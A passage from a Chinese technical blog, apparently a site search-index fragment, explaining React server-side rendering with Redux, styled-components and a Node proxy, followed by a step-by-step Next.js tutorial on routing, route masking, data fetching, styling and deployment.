Webpack中，Entry 的配置首先肯定是不同的\n在服务器端运行的代码，有时我们需要引入 Node 中的一些核心模块，我们需要 Webpack 做打包的时候能够识别出类似的核心模块，一旦发现是核心模块，不必把模块的代码合并到最终生成的代码中，解决这个问题的方法非常简单，在服务器端的 Webpack配置中，你只要加入 target: node 这个配置即可\n服务器端渲染的代码，如果加载第三方模块，这些第三方模块也是不需要被打包到最终的源码中的，因为 Node环境下通过 NPM 已经安装了这些包，直接引用就可以，不需要额外再打包到代码里。为了解决这个问题，我们可以使用 webpack-node-externals 这个插件，代码中的 nodeExternals指的就是这个插件，通过这个插件，我们就能解决这个问题。关于 Node 这里的打包问题，可能看起来有些抽象，不是很明白的同学可以仔细读一下 webpack-node-externals 相关的文章或文档，你就能很好的明白这里存在的问题了\n当我们的 React 代码中引入了一些 CSS 样式代码时，服务器端打包的过程会处理一遍 CSS，而客户端又会处理一遍。查看配置，我们可以看到，服务器端打包时我们用了 isomorphic-style-loader，它处理 CSS 的时候，只在对应的 DOM 元素上生成 class 类名，然后返回生成的 CSS 样式代码\n而在客户端代码打包配置中，我们使用了 css-loader 和 style-loader，css-loader 不但会在 DOM 上生成 class 类名，解析好的 CSS 代码，还会通过 style-loader 把代码挂载到页面上。不过这么做，由于页面上的样式实际上最终是由客户端渲染时添加上的，所以页面可能会存在一开始没有样式的情况，为了解决这个问题， 我们可以在服务器端渲染时，拿到 isomorphic-style-loader 返回的样式代码，然后以字符串的形式添加到服务器端渲染的 HTML之中\n而对于图片等类型的文件引入，url-loader 也会在服务器端代码和客户端代码打包的过程中分别进行打包，这里，我偷了一个懒，无论服务器端打包还是客户端打包，我都让打包生成的文件存储在 public 目录下，这样，虽然文件会打包出来两遍，但是后打包出来的文件会覆盖之前的文件，所以看起来还是只有一份文件\n如果想进行优化，你可以让图片的打包只进行一次，借助一些 Webpack 的插件，实现这个也并非难事，你甚至可以自己也写一个 loader，来解决这样的问题\n如果你的 React 应用中没有异步数据的获取，单纯的做一些静态内容展示，经过上面的配置，你会发现一个简单的 SSR 应用很快的就可以被实现出来了。但是，真正的一个 React 项目中，我们肯定要有异步数据的获取，绝大多数情况下，我们还要使用 Redux 管理数据。而如果想在 SSR 应用中实现，就不是这么简单\n\n五、SSR 中异步数据的获取 + Redux 的使用客户端渲染中，异步数据结合 Redux 的使用方式遵循下面的流程\n\n创建 Store\n根据路由显示组件\n派发 Action 获取数据\n更新 Store 中的数据\n组件 Rerender\n\n\n而在服务器端，页面一旦确定内容，就没有办法 Rerender 了，这就要求组件显示的时候，就要把 Store 的数据都准备好，所以服务器端异步数据结合 Redux 的使用方式\n\n服务器端异步数据结合 Redux流程\n\n创建 Store\n根据路由分析 Store 中需要的数据\n派发 Action 获取数据\n更新Store 中的数据\n结合数据和组件生成 HTML，一次性返回\n\n5.1 服务器端渲染的流程\n创建 Store：这一部分有坑，要注意避免，大家知道，客户端渲染中，用户的浏览器中永远只存在一个 Store，所以代码上你可以这么写\n\nconst store = createStore(reducer, defaultState)export default store;\n\n\n然而在服务器端，这么写就有问题了，因为服务器端的 Store 是所有用户都要用的，如果像上面这样构建 Store，Store 变成了一个单例，所有用户共享 Store，显然就有问题了。所以在服务器端渲染中，Store 的创建应该像下面这样，返回一个函数，每个用户访问的时候，这个函数重新执行，为每个用户提供一个独立的 Store\n\nconst getStore = (req) =&gt; &#123;  return createStore(reducer, defaultState);&#125;export default getStore;\n\n\n根据路由分析 Store 中需要的数据： 要想实现这个步骤，在服务器端，首先我们要分析当前出路由要加载的所有组件，这个时候我们可以借助一些第三方的包，比如说 react-router-config, 具体这个包怎么使用，不做过多说明，大家可以查看文档，使用这个包，传入服务器请求路径，它就会帮助你分析出这个路径下要展示的所有组件\n派发 Action 获取数据: 接下来，我们在每个组件上增加一个获取数据的方法\n\nHome.loadData = (store) =&gt; &#123;  return store.dispatch(getHomeList())&#125;\n\n\n这个方法需要你把服务器端渲染的 Store 传递进来，它的作用就是帮助服务器端的 Store 获取到这个组件所需的数据。 所以，组件上有了这样的方法，同时我们也有当前路由所需要的所有组件，依次调用各个组件上的 loadData 方法，就能够获取到路由所需的所有数据内容了\n\n更新 Store 中的数据: 其实，当我们执行第三步的时候，已经在更新 Store 中的数据了，但是，我们要在生成 HTML 之前，保证所有的数据都获取完毕，这怎么处理呢\n// matchedRoutes 是当前路由对应的所有需要显示的组件集合matchedRoutes.forEach(item =&gt; &#123;  if (item.route.loadData) &#123;    const promise = new Promise((resolve, reject) =&gt; &#123;      item.route.loadData(store).then(resolve).catch(resolve);    &#125;)    promises.push(promise);  &#125;&#125;)Promise.all(promises).then(() =&gt; &#123;  // 生成 HTML 逻辑&#125;)\n\n\n这里，我们使用 Promise 来解决这个问题，我们构建一个 Promise 队列，等待所有的 Promise 都执行结束后，也就是所有 store.dispatch 都执行完毕后，再去生成 HTML。这样的话，我们就实现了结合 Redux 的 SSR 流程\n在上面，我们说到，服务器端渲染时，页面的数据是通过 loadData 函数来获取的。而在客户端，数据获取依然要做，因为如果这个页面是你访问的第一个页面，那么你看到的内容是服务器端渲染出来的，但是如果经过 react-router 路由跳转道第二个页面，那么这个页面就完全是客户端渲染出来的了，所以客户端也要去拿数据\n在客户端获取数据，使用的是我们最习惯的方式，通过 componentDidMount 进行数据的获取。这里要注意的是，componentDidMount 只在客户端才会执行，在服务器端这个生命周期函数是不会执行的。所以我们不必担心 componentDidMount 和 loadData 会有冲突，放心使用即可。这也是为什么数据的获取应该放到 componentDidMount 这个生命周期函数中而不是 componentWillMount 中的原因，可以避免服务器端获取数据和客户端获取数据的冲突\n\n六、处理styled-components样式\nstyled-components 暴露了 ServerStyleSheet ，它允许我们用 中的所有 styled 组件创建一个样式表。这个样式表稍后会传入我们的Html 模板\n\n//render.jsimport React from &#x27;react&#x27;;import &#123;StaticRouter&#125; from &#x27;react-router-dom&#x27;import &#123;renderToString&#125; from &#x27;react-dom/server&#x27;import renderHTML from &#x27;./template&#x27;import &#123; Provider &#125; from &#x27;react-redux&#x27;import &#123; ServerStyleSheet &#125; from &#x27;styled-components&#x27;;export const render = (store,routes,req,context)=&gt;&#123;    const sheet = new ServerStyleSheet(); // &lt;-- 创建样式表    const content = renderToString(      // 收集样式      sheet.collectStyles(        &lt;Provider store=&#123;store&#125;&gt;          &lt;StaticRouter location=&#123;req.path&#125; context=&#123;context&#125;&gt;            &#123;routes&#125;          &lt;/StaticRouter&gt;        &lt;/Provider&gt;      )    )    const styles = sheet.getStyleTags(); // &lt;-- 从表中获取所有标签    return renderHTML(content,store,styles)&#125;\n\n\n将 styles 作为参数添加到我们的 Html 函数中，并将 $ &#123;styles&#125; 参数插入到我们的模板字符串中\n\n// template.jsexport default (content,store,styles)=&gt;`  &lt;!DOCTYPE html&gt;    &lt;html lang=&quot;en&quot;&gt;      &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&quot; /&gt;        &lt;meta name=&quot;theme-color&quot; content=&quot;#000000&quot;&gt;        &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;        &lt;meta name=&quot;apple-touch-fullscreen&quot; content=&quot;yes&quot;&gt;        &lt;title&gt;好物为您聚集大平台的优惠商品，让你更便捷的找到你想要的宝物&lt;/title&gt;        &lt;link rel=&quot;shortcut icon&quot; href=&quot;/favicon.ico&quot;&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;$&#123;buildPath[&#x27;vendor.css&#x27;]&#125;&quot; /&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;$&#123;buildPath[&#x27;main.css&#x27;]&#125;&quot; /&gt;        $&#123;styles&#125;      &lt;/head&gt;      &lt;body&gt;      &lt;div id=&quot;root&quot;&gt;$&#123;content&#125;&lt;/div&gt;      &lt;script&gt;        window.context = &#123;          state: $&#123;JSON.stringify(store.getState())&#125;        &#125;      &lt;/script&gt;      &lt;/body&gt;  &lt;/html&gt;`\n\n七、Node 只是一个中间层\n在 SSR 架构中，一般 Node 只是一个中间层，用来做 React 代码的服务器端渲染，而 Node 需要的数据通常由 API 服务器单独提供\n\n\n\n服务器端渲染时，直接请求 API 服务器的接口获取数据没有任何问题。但是在客户端，就有可能存在跨域的问题了，所以，这个时候，我们需要在服务器端搭建 Proxy 代理功能，客户端不直接请求 API 服务器，而是请求 Node 服务器，经过代理转发，拿到 API 服务器的数据\n\n\n这里你可以通过 express-http-proxy 这样的工具帮助你快速搭建 Proxy 代理功能，但是记得配置的时候，要让代理服务器不仅仅帮你转发请求，还要把 cookie 携带上，这样才不会有权限校验上的一些问题。\n\n// Node 代理功能实现代码app.use(&#x27;/api&#x27;, proxy(&#x27;http://apiServer.com&#x27;, &#123;  proxyReqPathResolver: function (req) &#123;    return &#x27;/ssr&#x27; + req.url;  &#125;&#125;));\n\n八、完整代码示例\nhttps://github.com/poetries/react-ssr\n\n","categories":["框架"],"tags":["React"]},{"title":"React-SSR优化Next构建2","url":"/2020/03/15/React/React-SSR%E4%BC%98%E5%8C%96Next%E6%9E%84%E5%BB%BA2/","content":"一、Next.js是什么\nNext.js是一个基于React的一个服务端渲染简约框架。它使用React语法，可以很好的实现代码的模块化，有利于代码的开发和维护\n\n1.1 Next.js带来了很多好的特性\n默认服务端渲染模式，以文件系统为基础的客户端路由\n代码自动分隔使页面加载更快\n以页面为基础的简洁的客户端路由\n以webpack的热替换为基础的开发环境\n使用React的JSX和ES6的module，模块化和维护更方便\n可以运行在Express和其他Node.js的HTTP 服务器上\n可以定制化专属的babel和webpack配置\n\n二、构建一个基本的Next项目2.1 创建项目// 在本地创建一个项目跟目录$ mkdir hello-next // 切换到项目根目录$ cd hello-next// 用npm初始化项目$ npm init -y// 将react和next安装到本地依赖$ npm install --save react react-dom next// 创建文件夹 pages$ mkdir pages\n\n\n创建完文件夹之后，打开hello-next文件下的package.json文件，在 scripts下添加一个script，如下\n\n&#123;  &quot;scripts&quot;: &#123;    &quot;dev&quot;: &quot;next&quot;  &#125;&#125;$ npm run dev\n\n2.2 创建页面\nNext.js是从服务器生成页面，再返回给前端展示。Next.js默认从 pages 目录下取页面进行渲染返回给前端展示，并默认取 pages/index.js 作为系统的首页进行展示。注意，pages 是默认存放页面的目录，路由的根路径也是pages目录\n\n\n在 pages/index.js 中创建一个React函数式组件\n\nconst Index = () =&gt; (  &lt;div&gt;    &lt;p&gt;Hello Next.js&lt;/p&gt;  &lt;/div&gt;)export default Index\n\n\nNext.js默认使用Webpack构建项目，webpack的热部署功能一样能提升开发效率。创建完 pages/index.js 后，再访问 http://localhost:3000 即可看到设置好的页面\n\n\n在 pages 目录下创建文件 pages/about.js\n\nexport default () =&gt; (  &lt;div&gt;    &lt;p&gt;This is the about page&lt;/p&gt;  &lt;/div&gt;)\n\n\n创建完之后，可以通过 http://localhost:3000/about 访问该页面。至此，所有的页面的路由都是通过后端服务器来控制的，要想实现客户端路由，需要借助Next.js的Link API。\n\nLink API\n\n从 next/link中可以引用到 Link 组件。在pages/index.js文件中引用Link，修改如\n\n// This is the Link APIimport Link from &#x27;next/link&#x27;const Index = () =&gt; (  &lt;div&gt;    &lt;Link href=&quot;/about&quot;&gt;      &lt;a&gt;About Page&lt;/a&gt;    &lt;/Link&gt;    &lt;p&gt;Hello Next.js&lt;/p&gt;  &lt;/div&gt;)export default Index\n\n\nLink组件是通过location.history的浏览器API保存历史路由，所以，你可以通过浏览器左上角的前进和后退按钮来切换历史路由。而在开发过程中，你不需要再单独写客户端路由的配置\nLink组件是React的高阶组件的实现，不能对它进行样式的设置，它只是起到路由的跳转功能，但是它的复用性强，只要包含一个能触发onClick事件的组件即可\n\n2.3 组件复用\nNext.js是以多页面为中心，只要将页面文件放在pages目录下，就可以在浏览器上以文件名为路由名来访问到\n\n\n组件的设置跟React一样，通过export导出，通过import导入。一般，只要不想让用户通过页面直接访问的组件，都不放在pages目录下。对除了pages目录，组件放在哪个目录下没有要求，开发者可以自定义设置\n\n\n下面再 components 目录下，创建一个公用组件 Header，用于各个文件的头部导航，通过导航可以在页面见切换\n\nimport Link from &#x27;next/link&#x27;const linkStyle = &#123;  marginRight: 15&#125;const Header = () =&gt; (  &lt;div&gt;    &lt;Link href=&quot;/&quot;&gt;      &lt;a style=&#123;linkStyle&#125;&gt;Home&lt;/a&gt;    &lt;/Link&gt;    &lt;Link href=&quot;/about&quot;&gt;      &lt;a style=&#123;linkStyle&#125;&gt;About&lt;/a&gt;    &lt;/Link&gt;  &lt;/div&gt;)export default Header\n\n在 pages/index.js 中引入Header\nimport Header from &#x27;../components/Header&#x27;export default () =&gt; (  &lt;div&gt;    &lt;Header /&gt;    &lt;p&gt;Hello Next.js&lt;/p&gt;  &lt;/div&gt;)\n\n\n进一步封装Header组件，创建一个自动包含Header和Content的组件 components/MyLayout.js\n\nimport Header from &#x27;./Header&#x27;const layoutStyle = &#123;  margin: 20,  padding: 20,  border: &#x27;1px solid #DDD&#x27;&#125;const Layout = (props) =&gt; (  &lt;div style=&#123;layoutStyle&#125;&gt;    &lt;Header /&gt;    &#123;props.children&#125;  &lt;/div&gt;)export default Layout\n\n2.4 创建动态页面\n使用Next.js创建动态页面，与使用React或Vue创建一个SPA页面大体相同，唯一的区别就是页面的渲染主体不同，前者是Nodejs服务器获取到后端数据渲染完页面后再返回给前端展示，后者是前端先获取页面主体架构，再通过ajax的方式请求后端的数据，在前端渲染展示\n\n以一个简易的博客页面为例，创建博客列表页，修改 pages/index.js\nimport Layout from &#x27;../components/MyLayout.js&#x27;import Link from &#x27;next/link&#x27;const PostLink = (props) =&gt; (  &lt;li&gt;    &lt;Link href=&#123;`/post?title=$&#123;props.title&#125;`&#125;&gt;      &lt;a&gt;&#123;props.title&#125;&lt;/a&gt;    &lt;/Link&gt;  &lt;/li&gt;)export default () =&gt; (  &lt;Layout&gt;    &lt;h1&gt;My Blog&lt;/h1&gt;    &lt;ul&gt;      &lt;PostLink title=&quot;Hello Next.js&quot;/&gt;      &lt;PostLink title=&quot;Learn Next.js is awesome&quot;/&gt;      &lt;PostLink title=&quot;Deploy apps with Zeit&quot;/&gt;    &lt;/ul&gt;  &lt;/Layout&gt;)\n\n\n有了列表页，需要再写一个博客的详情页，从上面的代码中也可看到，我们需要创建一个 pages/post.js文件\n\nimport Layout from &#x27;../components/MyLayout.js&#x27;export default (props) =&gt; (  &lt;Layout&gt;    &lt;h1&gt;&#123;props.url.query.title&#125;&lt;/h1&gt;    &lt;p&gt;This is the blog post content.&lt;/p&gt;  &lt;/Layout&gt;)\n\n2.5 用路由遮盖（Route Masking）的干净的URL\nNext.js`上提供了一个独特的特性：路由遮盖（Route Masking）。它可以使得在浏览器上显示的是路由`A`，而`App`内部真正的路由是`B`。这个特性可以让我们来设置一些比较简洁的路由显示在页面，而系统背后是使用一个带参数的路由。比如上面的例子中，地址栏中显示的是 `http://localhost:3000/post?title=Hello%20Next.js` ，这个地址含有一个`title`参数，看着很不整洁。下面我们就用`Next.js`来改造路由，使用路由遮盖来创建一个更加简洁的路由地址。比如我们将该地址改造成 `http://localhost:3000/p/hello-nextjs\n\n首先我们要修改 pages/index.js 下的PostLink组件，会使用到 next/link 组件的 as 属性，并给组件添加一个属性 id\nimport Layout from &#x27;../components/MyLayout.js&#x27;import Link from &#x27;next/link&#x27;const PostLink = (props) =&gt; (  &lt;li&gt;    &lt;Link as=&#123;`/p/$&#123;props.id&#125;`&#125;       href=&#123;`/post?title=$&#123;props.title&#125;`&#125;&gt;      &lt;a&gt;&#123;props.title&#125;&lt;/a&gt;    &lt;/Link&gt;  &lt;/li&gt;)export default () =&gt; (  &lt;Layout&gt;    &lt;h1&gt;My Blog&lt;/h1&gt;    &lt;ul&gt;      &lt;PostLink id=&quot;hello-nextjs&quot;         title=&quot;Hello Next.js&quot;/&gt;      &lt;PostLink id=&quot;learn-nextjs&quot;         title=&quot;Learn Next.js is awesome&quot;/&gt;      &lt;PostLink id=&quot;deploy-nextjs&quot;         title=&quot;Deploy apps with Zeit&quot;/&gt;    &lt;/ul&gt;  &lt;/Layout&gt;)\n\n\n当在 Link 组件上使用 as 属性时，浏览器上显示的是 as 属性的值，走的是客户端路由，而服务器真正映射的是 href 属性的值，走的是服务端路由\n这样就会有一个问题，如果在前端路由间切换不会有问题，可以正常显示，但是在页面 http://localhost:3000/p/hello-nextjs 时刷新页面，会显示 404页面。这是因为路由遮盖默认只在客户端路由中有效，要想在服务端也支持路由遮盖，需要在服务端单独设置路由解析的方法\n\n2.6 服务端支持路由遮盖\n上面说到，服务器默认不支持路由遮盖，要让服务器支持它，需要单独对路由进行设置。下面以 Express（你也可以使用Koa等其他Nodejs的Web服务器框架）创建后端服务器讲解如何设置服务器来支持路由遮盖\n\n$ npm install --save express\n\n在项目目录下创建 server.js ，添加内容如下\nconst express = require(&#x27;express&#x27;)const next = require(&#x27;next&#x27;)const dev = process.env.NODE_ENV !== &#x27;production&#x27;const app = next(&#123; dev &#125;)const handle = app.getRequestHandler()app.prepare().then(() =&gt; &#123;  const server = express()  server.get(&#x27;/p/:id&#x27;, (req, res) =&gt; &#123;    const actualPage = &#x27;/post&#x27;    const queryParams = &#123;         title: req.params.id     &#125;     app.render(req, res, actualPage, queryParams)  &#125;)  server.get(&#x27;*&#x27;, (req, res) =&gt; &#123;    return handle(req, res)  &#125;)  server.listen(3000, (err) =&gt; &#123;    if (err) throw err    console.log(&#x27;&gt; Ready on http://localhost:3000&#x27;)  &#125;)&#125;).catch((ex) =&gt; &#123;  console.error(ex.stack)  process.exit(1)&#125;)\n\n并更新 package.json 文件中的 scripts：\n&#123;  &quot;scripts&quot;: &#123;    &quot;dev&quot;: &quot;node server.js&quot;  &#125;&#125;\n\n\n这时候，服务器已经可以支持路由遮盖了，在显示遮盖路由的页面，刷新页面也可以正常显示内容。具体的实现是在服务器中对 /p/* 开头的路由进行重写，然后重定向到 /post 开头的路由上，最后将内容返回给前端。具体代码是这一段：\n\nserver.get(&#x27;/p/:id&#x27;, (req, res) =&gt; &#123;  const actualPage = &#x27;/post&#x27;  const queryParams = &#123;       title: req.params.id   &#125;   app.render(req, res, actualPage, queryParams)&#125;)\n\n2.7 请求接口，获取数据\nNext.js 在 React的基础上为组件添加了一个新的特性： getInitialProps（有点像是getInitialState），它用于获取并处理组件的属性，返回组件的默认属性。我们可以在改方法中请求数据，获取页面需要的数据并渲染返回给前端页面\n\n引入一个支持在客户端和服务器端发送 fetch 请求的插件 isomorphic-unfetch，当然你也可以使用 axios 等其他工具\n$ npm install --save isomorphic-unfetch\n\n然后修改 pages/index.js 里的内容，换成下面这样：\nimport Layout from &#x27;../components/MyLayout.js&#x27;import Link from &#x27;next/link&#x27;import fetch from &#x27;isomorphic-unfetch&#x27;const Index = (props) =&gt; (  &lt;Layout&gt;    &lt;h1&gt;Batman TV Shows&lt;/h1&gt;    &lt;ul&gt;      &#123;props.shows.map((&#123;show&#125;) =&gt; (        &lt;li key=&#123;show.id&#125;&gt;          &lt;Link as=&#123;`/p/$&#123;show.id&#125;`&#125;             href=&#123;`/post?id=$&#123;show.id&#125;`&#125;&gt;            &lt;a&gt;&#123;show.name&#125;&lt;/a&gt;          &lt;/Link&gt;        &lt;/li&gt;      ))&#125;    &lt;/ul&gt;  &lt;/Layout&gt;)Index.getInitialProps = async function() &#123;  const res = await fetch(&#x27;https://api.tvmaze.com/search/shows?q=batman&#x27;)  const data = await res.json()  console.log(`Show data fetched. Count: $&#123;data.length&#125;`)  return &#123;    shows: data  &#125;&#125;export default Index\n\n\n上述代码中，在 getInitialProps 中使用了 async 和 await 来处理异步请求，并将取到的数据当做一个属性赋给页面，页面拿到这个属性的值后会用于页面的初始化渲染\n\n2.8 样式化组件\nNext.js 提供了一个 css-in-js 的特性，它允许你在组件内部写一些样式，你只需要在组件内使用 &#96;&#96; 标签来写 css 即可。举个例子，比如我们在 pages/index.js里添加样式\n\nimport Layout from &#x27;../components/MyLayout.js&#x27;import Link from &#x27;next/link&#x27;function getPosts () &#123;  return [    &#123;       id: &#x27;hello-nextjs&#x27;,       title: &#x27;Hello Next.js&#x27;    &#125;,    &#123;       id: &#x27;learn-nextjs&#x27;,       title: &#x27;Learn Next.js is awesome&#x27;    &#125;,    &#123;       id: &#x27;deploy-nextjs&#x27;,       title: &#x27;Deploy apps with ZEIT&#x27;    &#125;  ]&#125;export default () =&gt; (  &lt;Layout&gt;    &lt;h1&gt;My Blog&lt;/h1&gt;    &lt;ul&gt;      &#123;getPosts().map((post) =&gt; (        &lt;li key=&#123;post.id&#125;&gt;          &lt;Link as=&#123;`/p/$&#123;post.id&#125;`&#125;             href=&#123;`/post?title=$&#123;post.title&#125;`&#125;&gt;            &lt;a&gt;&#123;post.title&#125;&lt;/a&gt;          &lt;/Link&gt;        &lt;/li&gt;      ))&#125;    &lt;/ul&gt;    &lt;style jsx&gt;&#123;`      h1, a &#123;        font-family: &quot;Arial&quot;;      &#125;      ul &#123;        padding: 0;      &#125;      li &#123;        list-style: none;        margin: 5px 0;      &#125;      a &#123;        text-decoration: none;        color: blue;      &#125;      a:hover &#123;        opacity: 0.6;      &#125;    `&#125;&lt;/style&gt;  &lt;/Layout&gt;)\n\n\n在上述代码中，我们没有直接使用 标签来书写样式代码，而是写在一个模板字符串`（&#123;}）里面。Next.js使用babel插件来解析styled-jsx&#96; ，它支持样式命名空间，未来还将支持变量赋值。\n\n需要注意的是：styled-jsx 的样式不会应用到子组件，如果想要该样式适用于子组件，可以在styled-jsx 标签添加属性 global：。\n2.9 怎么部署一个next.js项目\nNext.js 项目的部署，需要一个 Node.js的服务器，可以选择 Express, Koa或其他 Nodejs 的Web服务器。本文中以 Express 为例来部署 Next 项目。\n\n服务器的入口文件就使用上文中提到的 server.js，在 server.js 里添加了针对部署环境的选择，代码如下\nconst dev = process.env.NODE_ENV !== &#x27;production&#x27;\n\n\n为了区分部署环境，我们需要在 package.json 中修改 script 属性如下\n\n&quot;scripts&quot;: &#123;  &quot;build&quot;: &quot;next build&quot;,  &quot;start&quot;: &quot;NODE_ENV=production node server.js -&quot;,  &quot;dev&quot;: &quot;NODE_ENV=dev node server.js&quot;&#125;\n\n\n其中，build 命令是用于打包项目，start 命令是用于生产环境部署，dev 命令是用于本地开发。\n\n执行如下命令即可将Next项目 部署到服务器\n$ npm run build$ npm run start\n\n2.10 完整代码示例\nhttps://github.com/poetries/react-next\n\n三、更多须知3.1 创建 /static 文件夹，存放静态资源\n静态资源文件夹文件会映射到 /static/ 路由下，直接通过 http://localhost:3000/static/test.png 访问\n\n3.2 使用内置组件 &#96;&#96; 定制每个页面的 head 部分import Head from &#x27;next/head&#x27;; // 引入内置组件export default () =&gt; (   &lt;div&gt;      &lt;Head&gt;         &lt;title&gt;index page&lt;/title&gt;         &lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, width=device-width&quot;/&gt;      &lt;/Head&gt;      &lt;div&gt;this is index page&lt;/div&gt;   &lt;/div&gt;);\n\n3.3 使用内置组件 &#96;&#96; 进行路由跳转import Link from &#x27;next/link&#x27;;export default () =&gt; (   &lt;div&gt;      &lt;p&gt;this is home index page&lt;/p&gt;      &lt;Link href=&quot;/about&quot;&gt;         &lt;a&gt; to about page&lt;/a&gt;      &lt;/Link&gt;   &lt;/div&gt;);\n\n更多 Link 使用方式\nimport React, &#123;Component&#125; from &#x27;react&#x27;;import Link from &#x27;next/link&#x27;;export default class About extends Component &#123;   constructor(props) &#123;      super(props);   &#125;   render() &#123;      // href 值可以是一个对象      const href = &#123;         pathname: &#x27;/home&#x27;,         query: &#123;name: &#x27;test&#x27;&#125;      &#125;;      return (        &lt;div&gt;           &lt;p&gt;this is about page &lt;/p&gt;           &lt;img src=&quot;/static/test.png&quot; alt=&quot;test&quot;/&gt;           &#123;/* replace 覆盖历史跳转 */&#125;           &lt;Link href=&#123;href&#125; replace&gt;            &lt;a&gt;click to home index page&lt;/a&gt;           &lt;/Link&gt;        &lt;/div&gt;       );   &#125;&#125;\n\n3.4 使用内置 router 方法，手动触发路由跳转\nnext/router 提供一套方法和属性，帮助确认当前页面路由参数，和手动触发路由跳转\n\nimport router from &#x27;next/router&#x27;;/*    router.pathname  ==&gt; /home    router.query ==&gt; &#123;&#125;    router.route - 当前路由    asPath - 显示在浏览器地址栏的实际的路由    push(url, as=url) - 跳转页面的方法    replace(url, as=url) - 跳转页面*/\n\n\n更好的方式使用路由 – router 的 withRouter 方法\n\nimport Link from &#x27;next/link&#x27;;import &#123;withRouter&#125; from &#x27;next/router&#x27;;const Home = (props) =&gt; &#123;    // 这里的 props 会得到 &#123;router, url&#125; 两个属性    // router: &#123;push: ƒ, replace: ƒ, reload: ƒ, back: ƒ, prefetch: ƒ, …&#125;    // url: &#123;query: &#123;…&#125;, pathname: &quot;/home&quot;, asPath: &quot;/home?name=test&quot;, back: ƒ, push: ƒ, …&#125;   console.log(props);   return (      &lt;div&gt;         &lt;p&gt;this is home index page &lt;/p&gt;         &#123;/* &lt;Link href=&quot;/about&quot;&gt;            &lt;a&gt; to about page&lt;/a&gt;         &lt;/Link&gt; */&#125;      &lt;/div&gt;   );&#125;export default withRouter(Home);\n\n3.5 使用 next-redux-wrapper 插件辅助实现 redux1. 安装依赖\nsudo yarn add next-redux-wrapper redux react-redux redux-devtools-extension redux-thunk\n\n2. 创建 initializeStore.js 一个可以返回 store 实例的函数\n\n在这个文件中会完成装载中间件、绑定reducer、链接浏览器的redux调试工具等操作\n\nimport &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import &#123; composeWithDevTools &#125; from &#x27;redux-devtools-extension&#x27;; import thunk from &#x27;redux-thunk&#x27;;import reducer from &#x27;../modules/reducers&#x27;;const middleware = [thunk];const initializeStore = initialState =&gt; &#123;   return createStore(         reducer,          initialState,          composeWithDevTools(applyMiddleware(...middleware))      );&#125;;export default initializeStore;\n\n3. 创建 reducer , action\n\n与普通 react-redux 项目创建 reducer, action 的方法一致，我把这部分代码都提取到一个名为 modules的文件夹中\n\n// /modules/reducers.jsimport &#123; combineReducers &#125; from &#x27;redux&#x27;;import about from &#x27;./about/reducer&#x27;;// 合并到主reducerconst reducers = &#123;   about&#125;;// combineReducers() 函数用于将分离的 reducer 合并为一个 reducer export default combineReducers(reducers);// /modules/about/reudcer.js // /about 页面的 reducerimport &#123;   CHANGE_COUNT&#125; from &#x27;../types-constant&#x27;;const initialState = &#123;   count: 0&#125;;const typesCommands = &#123;   [CHANGE_COUNT](state, action) &#123;      return Object.assign(&#123;&#125;, state, &#123; count: action.msg &#125;);   &#125;,&#125;export default function home(state = initialState, action) &#123;   const actionResponse = typesCommands[action.type];   return actionResponse ? actionResponse(state, action) : state;&#125;// /modules/about/actions.js// /about 页面的 actionimport &#123;   CHANGE_COUNT&#125; from &#x27;../types-constant&#x27;;export function changeCount(newCount) &#123;   return &#123;      type: CHANGE_COUNT,      msg: newCount   &#125;;&#125;\n\n4. 页面中使用\n\n需要用到 next-redux-wrapper 提供的 withRedux 高阶函数，以及 react-redux 提供的 connect 高阶函数\n\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import withRedux from &#x27;next-redux-wrapper&#x27;;import &#123; connect &#125; from &#x27;react-redux&#x27;;import &#123; bindActionCreators &#125; from &#x27;redux&#x27;;import AboutCom from &#x27;../components/About/index&#x27;;import initializeStore from &#x27;../store/initializeStore&#x27;;import &#123; changeCount &#125; from &#x27;../modules/about/actions&#x27;;class About extends Component &#123;   constructor(props) &#123;      super(props);   &#125;   render() &#123;      const &#123; about: &#123; count &#125;, changeCount &#125; = this.props;      return &lt;AboutCom count=&#123;count&#125; changeCount=&#123;changeCount&#125; /&gt;;   &#125;&#125;const connectedPage = connect(   state =&gt; (&#123; about: state.about &#125;),   dispatch =&gt; (&#123;      changeCount: bindActionCreators(changeCount, dispatch)   &#125;))(About);export default withRedux(initializeStore)(connectedPage);\n\n3.6 处理styled-components样式\n在pages/_document.js中处理\n\nimport Document, &#123; Head, Main, NextScript &#125; from &#x27;next/document&#x27;import &#123; ServerStyleSheet &#125; from &#x27;styled-components&#x27;const pro = process.env.NODE_ENV === &#x27;production&#x27;const path = pro ? &#x27;https://cdn.yesdat.com&#x27; : &#x27;&#x27;export default class MyDocument extends Document &#123;  static getInitialProps(&#123; renderPage &#125;) &#123;    // 新建一个样式表    const sheet = new ServerStyleSheet()         // 收集样式    const page = renderPage(App =&gt; props =&gt; sheet.collectStyles(&lt;App &#123;...props&#125; /&gt;))    const styleTags = sheet.getStyleElement()    const &#123;      html, head, errorHtml, chunks,    &#125; = renderPage()    return &#123;      html, head, errorHtml, chunks,...page, styleTags    &#125;  &#125;  render() &#123;    return (      &lt;html lang=&quot;en&quot;&gt;        &lt;Head&gt;          &lt;meta charSet=&quot;utf-8&quot; /&gt;          &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&quot; /&gt;          &lt;meta name=&quot;theme-color&quot; content=&quot;#000000&quot; /&gt;          &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;          &lt;meta name=&quot;apple-touch-fullscreen&quot; content=&quot;yes&quot; /&gt;          &lt;link rel=&quot;stylesheet&quot; href=&#123;`$&#123;path&#125;/static/styles/antd_mobile_min.css`&#125; /&gt;          &lt;link rel=&quot;stylesheet&quot; href=&#123;`$&#123;path&#125;/static/styles/app_min.css?8`&#125; /&gt;          &lt;link rel=&quot;stylesheet&quot; href=&#123;`$&#123;path&#125;/static/styles/nprogress.css`&#125; /&gt;          &lt;link rel=&quot;stylesheet&quot; href=&#123;`$&#123;path&#125;/static/styles/index.css`&#125; /&gt;          &#123;/* 